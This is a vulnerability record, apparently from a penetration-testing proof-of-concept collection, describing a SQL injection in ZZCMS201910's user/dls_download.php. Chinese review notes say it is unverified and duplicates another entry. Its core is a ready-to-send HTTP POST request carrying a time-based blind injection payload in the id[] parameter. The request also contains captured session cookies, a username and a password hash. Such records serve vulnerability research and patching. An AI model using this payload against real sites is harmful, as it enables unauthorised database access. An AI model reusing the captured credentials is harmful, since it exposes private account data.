---
source: "Mr-xn/Penetration_Testing_POC"
product: "ZZCMS201910"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ZZCMS201910 SQL Injections"
prerequisites: "来源所述条件，未列明部分仍待核：VIPwithdownloadpermission; idarray; authenticatedcookies"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-dc416c72a652330f22e58fd5"
entity_id: "ve-bc0cf9e79288a9265f98ae70"
schema_version: "1"
canonical: "Web安全/CMS内容/ZZCMS/ZZCMS201910 SQL注入.md"
relation_type: "duplicate_of"
---

## 核对与使用边界


本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：VIPwithdownloadpermission; idarray; authenticatedcookies

- **事实待核（1）**：全文与655除标题/来源尾注相同，确认跨产品版本目录重复。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **凭据与会话边界（2）**：VIP前提、完整相同Cookie/payload/原GitHubissue应合并到一个记录而不是两漏洞。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **凭据与会话边界（3）**：混入metinfoCookie，需核对字段归属并补响应/修复，不能自动当已核漏洞。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ZZCMS201910 SQL Injections

## ZZCMS201910 SQL Injections SQL注入  

> 前提是你有一个具有购买权限的VIP会员账户
> 不然会提示：`"您所在的用户组没有下载此信息的权限！<br><input  type=button value=升级成VIP会员 onclick=\"location.href='/one/vipuser.php'\"/>"`  

### 注入点 ` user/dls_download with parameter $id`

### 利用POC如下  

```raw
POST /user/dls_download.php HTTP/1.1
Host: test.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://test.com
Connection: close
Referer: http://test.com/user/advzt_manage.php
Cookie: Hm_lvt_f6f37dc3416ca514857b78d0b158037e=1576564072; Hm_lvt_520556228c0113270c0c772027905838=1576734687,1577071433; app_href_source=myapp/free; PHPSESSID=f0fb73cc2f2d41d2a3b1edb7340841a3; arrlanguage=metinfo; Hm_lpvt_520556228c0113270c0c772027905838=1577672843; acc_auth=4b90lwFZZGUdz47dUybObYz1MoB612Tg7bCn10U0P4BKoY%2FR9nnvQapvPIBF%2BB4w11KPOWCNH%2FLvwx9rH7424ZH0; acc_key=eXM7G4F; __tins__713776=%7B%22sid%22%3A%201577775703119%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201577777503119%7D; __51cke__=; __51laig__=28; bdshare_firstime=1577771760963; UserName=test; PassWord=4297f44b13955235245b2497399d7a93
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

id[]=1&id[]=2)%0aor%0asleep(5)%23&FileExt=xxx
```

来源与：https://github.com/JcQSteven/blog/issues/15


---

> 来源：Mr-xn/Penetration_Testing_POC
